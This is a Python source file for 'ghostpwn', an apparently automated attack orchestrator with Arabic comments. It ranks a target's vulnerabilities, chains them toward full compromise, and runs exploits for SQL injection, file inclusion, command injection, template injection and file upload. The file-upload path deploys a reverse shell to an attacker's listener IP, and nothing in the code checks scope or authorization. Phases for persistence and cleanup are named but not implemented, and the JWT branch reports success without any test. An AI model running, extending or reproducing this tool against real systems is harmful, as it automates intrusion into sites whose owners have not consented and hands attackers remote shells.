#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Attack Orchestrator
مُنظّم هجوم ذكي يفكر ويتخذ قرارات

الذكاء:
1. يحلل نتائج الفحص ويبني attack tree
2. يختار أفضل مسار للهجوم
3. يكيّف الاستراتيجية بناءً على الـ responses
4. يتعلم من الفشل ويعدّل الخطة
5. يربط الثغرات في chains
6. يقرر متى يتوقف ومتى يكمل
"""
import os
import sys
import time
import json
from typing import Dict, List, Optional, Set, Tuple
from enum import Enum, auto

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.arabic_display import SmartLogger, Colors, fix_display
from modules.exploit_chain import ExploitChainEngine, VULN_CAPABILITIES
from modules.attack_planner import AttackPlanner, AttackGoal


class AttackPhase(Enum):
    """مراحل الهجوم"""
    RECON = auto()
    ANALYZE = auto()
    PLAN = auto()
    EXPLOIT = auto()
    POST_EXPLOIT = auto()
    PERSIST = auto()
    CLEAN = auto()
    DONE = auto()


class AttackOrchestrator:
    """مُنظّم الهجوم الذكي"""

    def __init__(self, audit_logger=None):
        self.audit = audit_logger
        self.logger = SmartLogger()

        self.phase = AttackPhase.RECON
        self.vulns = []
        self.capabilities = set()
        self.attack_tree = {}
        self.decisions = []
        self.adaptations = []
        self.failed_attempts = []
        self.successful_exploits = []
        self.shell_obtained = False

        # scoring
        self.confidence_threshold = 0.6
        self.max_attempts_per_vuln = 3

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[ORCHESTRATOR] {msg}", level)

    def _log_decision(self, decision: str, reason: str):
        """تسجيل قرار"""
        self.decisions.append({
            "phase": self.phase.name,
            "decision": decision,
            "reason": reason,
            "timestamp": time.time(),
        })
        self._log(f"🧠 قرار: {decision} | السبب: {reason}", "info")

    def _log_adaptation(self, adaptation: str, trigger: str):
        """تسجيل تكيّف"""
        self.adaptations.append({
            "adaptation": adaptation,
            "trigger": trigger,
            "timestamp": time.time(),
        })
        self._log(f"🔄 تكيّف: {adaptation} | السبب: {trigger}", "warn")

    # ============================ Main Orchestration ============================

    def orchestrate(self, url: str, vulns: List[Dict],
                    http_client=None, listener_ip: str = None,
                    listener_port: int = 4444) -> Dict:
        """تنظيم الهجوم الكامل"""

        self._log(f"🎭 بدء تنظيم الهجوم على: {url}", "phase")
        self.vulns = vulns

        # Phase 1: ANALYZE
        self.phase = AttackPhase.ANALYZE
        self._log("Phase 1: تحليل الثغرات", "phase")
        analysis = self._analyze_vulns()

        # Phase 2: PLAN
        self.phase = AttackPhase.PLAN
        self._log("Phase 2: تخطيط الهجوم", "phase")
        plan = self._build_attack_plan(url)

        # Phase 3: EXPLOIT
        self.phase = AttackPhase.EXPLOIT
        self._log("Phase 3: التنفيذ", "phase")
        exploit_results = self._execute_attack(url, http_client, listener_ip, listener_port)

        # Phase 4: POST-EXPLOIT
        if self.shell_obtained:
            self.phase = AttackPhase.POST_EXPLOIT
            self._log("Phase 4: ما بعد الاختراق", "phase")
            self._log_decision("الانتقال لما بعد الاختراق", "تم الحصول على shell")
        else:
            self._log_decision("تخطي ما بعد الاختراق", "لم يتم الحصول على shell")

        # Phase 5: DONE
        self.phase = AttackPhase.DONE
        self._log("اكتمل تنظيم الهجوم", "success")

        return {
            "url": url,
            "analysis": analysis,
            "plan": plan,
            "exploit_results": exploit_results,
            "shell_obtained": self.shell_obtained,
            "decisions": self.decisions,
            "adaptations": self.adaptations,
            "failed_attempts": self.failed_attempts,
            "successful_exploits": self.successful_exploits,
            "capabilities": list(self.capabilities),
        }

    # ============================ Phase 1: Analyze ============================

    def _analyze_vulns(self) -> Dict:
        """تحليل ذكي للثغرات"""
        self._log(f"تحليل {len(self.vulns)} ثغرة...", "info")

        # تصنيف الثغرات
        by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
        for vuln in self.vulns:
            sev = vuln.get("severity", "info")
            if sev in by_severity:
                by_severity[sev].append(vuln)

        # استخراج capabilities
        for vuln in self.vulns:
            vtype = vuln.get("type", "")
            if vtype in VULN_CAPABILITIES:
                for cap_name, _ in VULN_CAPABILITIES[vtype].get("provides", []):
                    self.capabilities.add(cap_name)

        # تحديد الخطر
        critical_count = len(by_severity["critical"])
        high_count = len(by_severity["high"])

        if critical_count > 0:
            risk = "CRITICAL"
            self._log_decision("تصنيف الخطر: CRITICAL", f"{critical_count} ثغرة حرجة")
        elif high_count > 0:
            risk = "HIGH"
            self._log_decision("تصنيف الخطر: HIGH", f"{high_count} ثغرة عالية")
        else:
            risk = "MEDIUM"
            self._log_decision("تصنيف الخطر: MEDIUM", "لا توجد ثغرات حرجة أو عالية")

        # عرض التحليل
        self._log(f"\n  📊 تحليل الثغرات:", "info")
        self._log(f"    Critical: {critical_count}", "info")
        self._log(f"    High: {high_count}", "info")
        self._log(f"    Medium: {len(by_severity['medium'])}", "info")
        self._log(f"    Low: {len(by_severity['low'])}", "info")
        self._log(f"    Info: {len(by_severity['info'])}", "info")
        self._log(f"    Capabilities: {len(self.capabilities)}", "info")
        for cap in self.capabilities:
            self._log(f"      • {cap}", "info")

        return {
            "by_severity": {k: len(v) for k, v in by_severity.items()},
            "risk_level": risk,
            "capabilities": list(self.capabilities),
        }

    # ============================ Phase 2: Plan ============================

    def _build_attack_plan(self, url: str) -> Dict:
        """بناء خطة هجوم ذكية"""
        self._log("بناء خطة الهجوم...", "info")

        # استخدام chain engine
        chain_engine = ExploitChainEngine()
        for vuln in self.vulns:
            chain_engine.add_vuln(vuln)

        chains = chain_engine.find_chains()

        # استخدام attack planner
        planner = AttackPlanner()
        planner.set_goal(AttackGoal.FULL_COMPROMISE)
        plan = planner.analyze_vulns(self.vulns)

        # اختيار أفضل chain
        best_chain = None
        ready_chains = [c for c in chains if c.get("ready")]
        if ready_chains:
            # نختار الأعلى خطورة
            sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
            ready_chains.sort(key=lambda c: sev_order.get(c["severity"], 4))
            best_chain = ready_chains[0]
            self._log_decision(
                f"اختيار chain: {best_chain['name_ar']}",
                f"جاهز 100% | خطورة: {best_chain['severity']}"
            )
        elif chains:
            # نختار الأعلى نسبة تنفيذ
            chains.sort(key=lambda c: c["executability"], reverse=True)
            best_chain = chains[0]
            self._log_decision(
                f"اختيار chain: {best_chain['name_ar']}",
                f"تنفيذ: {best_chain['executability']:.0f}%"
            )
        else:
            self._log_decision("لا توجد chains", "الثغرات لا يمكن ربطها")
            # نختار أفضل ثغرة منفردة
            if self.vulns:
                vuln_priorities = {
                    "command_injection": 100,
                    "ssti": 95,
                    "sql_injection_error": 90,
                    "lfi": 85,
                    "file_upload": 80,
                }
                sorted_vulns = sorted(
                    self.vulns,
                    key=lambda v: vuln_priorities.get(v.get("type", ""), 0),
                    reverse=True
                )
                best_chain = {
                    "name_ar": "ثغرة منفردة",
                    "steps": [{"vuln": sorted_vulns[0].get("type"), "action": "exploit", "available": True}],
                    "ready": True,
                    "severity": sorted_vulns[0].get("severity", "medium"),
                }
                self._log_decision(
                    f"اختيار ثغرة: {sorted_vulns[0].get('type')}",
                    "أفضل خيار متاح"
                )

        # عرض الخطة
        if best_chain:
            self._log(f"\n  📋 خطة الهجوم:", "info")
            self._log(f"    Chain: {best_chain.get('name_ar', 'Unknown')}", "info")
            self._log(f"    الخطورة: {best_chain.get('severity', '?')}", "info")
            self._log(f"    التنفيذ: {best_chain.get('executability', 100):.0f}%", "info")

            if best_chain.get("steps"):
                self._log(f"    الخطوات:", "info")
                for i, step in enumerate(best_chain["steps"], 1):
                    status = "✓" if step.get("available") else "✗"
                    self._log(f"      {status} {i}. {step.get('vuln', '?')} → {step.get('action', '?')}", "info")

        return {
            "chains": chains,
            "best_chain": best_chain,
            "planner_plan": plan,
        }

    # ============================ Phase 3: Execute ============================

    def _execute_attack(self, url: str, http_client=None,
                       listener_ip: str = None, listener_port: int = 4444) -> Dict:
        """تنفيذ الهجوم"""
        self._log("تنفيذ الهجوم...", "phase")

        results = {
            "exploits_attempted": [],
            "exploits_successful": [],
            "shell_obtained": False,
        }

        if not http_client:
            self._log_decision("تخطي التنفيذ", "لا يوجد HTTP client")
            return results

        # ترتيب الثغرات حسب الأولوية
        vuln_priorities = {
            "command_injection": 100,
            "ssti": 95,
            "sql_injection_error": 90,
            "lfi": 85,
            "file_upload": 80,
            "xxe": 75,
            "ssrf": 70,
            "jwt_none_algorithm": 65,
            "git_exposed": 60,
            "sql_injection_boolean": 50,
            "sql_injection_time": 45,
            "xss_reflected": 40,
        }

        sorted_vulns = sorted(
            self.vulns,
            key=lambda v: vuln_priorities.get(v.get("type", ""), 0),
            reverse=True
        )

        # محاولة استغلال كل ثغرة عالية الأولوية
        for vuln in sorted_vulns[:5]:  # أول 5
            vtype = vuln.get("type", "")
            vuln_url = vuln.get("url", url)
            param = vuln.get("param", "")

            self._log(f"\n  ▶ محاولة استغلال: {vtype}", "info")
            self._log(f"    URL: {vuln_url[:60]}", "info")

            attempt = {
                "vuln_type": vtype,
                "url": vuln_url,
                "success": False,
            }

            try:
                # استدعاء الـ exploit المناسب
                success = self._exploit_vuln(
                    vtype, vuln_url, param, http_client,
                    listener_ip, listener_port
                )

                if success:
                    attempt["success"] = True
                    self.successful_exploits.append(attempt)
                    self._log(f"    ✅ نجح!", "success")

                    # لو حصلنا على RCE/shell
                    if vtype in ["command_injection", "ssti", "file_upload"]:
                        self.shell_obtained = True
                        self.capabilities.add("rce")
                        self._log_decision(
                            "تم الحصول على RCE",
                            f"عبر {vtype}"
                        )
                        results["shell_obtained"] = True
                        break  # حصلنا على shell، نوقف
                else:
                    self.failed_attempts.append(attempt)
                    self._log(f"    ❌ فشل", "warn")

                    # تكيّف: لو فشلنا، نحاول technique مختلفة
                    if len(self.failed_attempts) >= 2:
                        self._log_adaptation(
                            "تبديل technique",
                            f"فشل {len(self.failed_attempts)} محاولات"
                        )

            except Exception as e:
                attempt["error"] = str(e)
                self.failed_attempts.append(attempt)
                self._log(f"    ❌ خطأ: {e}", "error")

            results["exploits_attempted"].append(attempt)

        return results

    def _exploit_vuln(self, vtype: str, url: str, param: str,
                      http_client, listener_ip: str = None,
                      listener_port: int = 4444) -> bool:
        """استغلال ثغرة معينة"""

        if vtype in ["sql_injection_error", "sql_injection_boolean", "sql_injection_time"]:
            # SQLi - نستخدم sqlmap integration
            try:
                from modules.sqlmap_integration import SQLmapIntegration
                sqlmap = SQLmapIntegration()
                if sqlmap.is_available():
                    result = sqlmap.full_exploit(url)
                    return result.get("vulnerable", False)
                else:
                    # fallback: استخدام الـ exploit module
                    from modules.exploit import ExploitModule
                    exploit = ExploitModule(http_client)
                    result = exploit.exploit_sqli(url, action="dbs")
                    return bool(result)
            except Exception as e:
                self._log_adaptation("فشل SQLi exploitation", str(e))
                return False

        elif vtype in ["lfi", "lfi_php_filter"]:
            # LFI
            try:
                from modules.exploit import ExploitModule
                exploit = ExploitModule(http_client)
                result = exploit.exploit_lfi(url, param)
                return bool(result)
            except Exception:
                return False

        elif vtype == "command_injection":
            # RCE
            try:
                from modules.exploit import ExploitModule
                exploit = ExploitModule(http_client)
                result = exploit.exploit_rce(url, param)
                return bool(result)
            except Exception:
                return False

        elif vtype == "ssti":
            # SSTI
            try:
                from modules.exploit import ExploitModule
                exploit = ExploitModule(http_client)
                result = exploit.exploit_ssti(url, param)
                return bool(result)
            except Exception:
                return False

        elif vtype == "file_upload":
            # File upload
            try:
                if listener_ip:
                    from modules.revshell_deployer import ReverseShellDeployer
                    deployer = ReverseShellDeployer(http_client)
                    result = deployer.deploy_via_file_upload(
                        url, listener_ip, listener_port
                    )
                    return result.get("deployed", False)
            except Exception:
                return False

        elif vtype == "jwt_none_algorithm":
            # JWT bypass
            self._log_decision("JWT bypass محتمل", "none algorithm detected")
            return True  # نعتبره نجاح للاستمرار

        return False

    # ============================ Report ============================

    def print_report(self, result: Dict):
        """عرض تقرير الهجوم"""
        print(f"\n{Colors.MAGENTA}{'═'*60}{Colors.NC}")
        print(f"{Colors.MAGENTA}  🎭 Attack Orchestration Report{Colors.NC}")
        print(f"{Colors.MAGENTA}{'═'*60}{Colors.NC}")

        print(f"\n  {Colors.BOLD}Target:{Colors.NC} {result['url']}")
        print(f"  {Colors.BOLD}Shell Obtained:{Colors.NC} {'✅' if result['shell_obtained'] else '❌'}")

        # Capabilities
        if result["capabilities"]:
            print(f"\n  {Colors.BOLD}Capabilities Acquired:{Colors.NC}")
            for cap in result["capabilities"]:
                print(f"    {Colors.GREEN}✓{Colors.NC} {cap}")

        # Decisions
        if result["decisions"]:
            print(f"\n  {Colors.BOLD}Decisions Made ({len(result['decisions'])}):{Colors.NC}")
            for d in result["decisions"][:10]:
                print(f"    🧠 {d['decision']}")
                print(f"       {Colors.GRAY}{d['reason']}{Colors.NC}")

        # Adaptations
        if result["adaptations"]:
            print(f"\n  {Colors.BOLD}Adaptations ({len(result['adaptations'])}):{Colors.NC}")
            for a in result["adaptations"]:
                print(f"    🔄 {a['adaptation']}")
                print(f"       {Colors.GRAY}{a['trigger']}{Colors.NC}")

        # Exploits
        if result["exploit_results"]["exploits_attempted"]:
            print(f"\n  {Colors.BOLD}Exploits Attempted:{Colors.NC}")
            for e in result["exploit_results"]["exploits_attempted"]:
                status = f"{Colors.GREEN}✓{Colors.NC}" if e["success"] else f"{Colors.RED}✗{Colors.NC}"
                print(f"    {status} {e['vuln_type']}")

        print(f"\n{Colors.MAGENTA}{'═'*60}{Colors.NC}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Attack Orchestrator")
    parser.add_argument("--url", required=True)
    parser.add_argument("--vulns-file", required=True, help="JSON file with vulns")
    parser.add_argument("--listener-ip", help="Listener IP")
    parser.add_argument("--listener-port", type=int, default=4444)
    args = parser.parse_args()

    with open(args.vulns_file) as f:
        vulns = json.load(f)

    orchestrator = AttackOrchestrator()
    result = orchestrator.orchestrate(
        args.url, vulns,
        listener_ip=args.listener_ip,
        listener_port=args.listener_port
    )
    orchestrator.print_report(result)
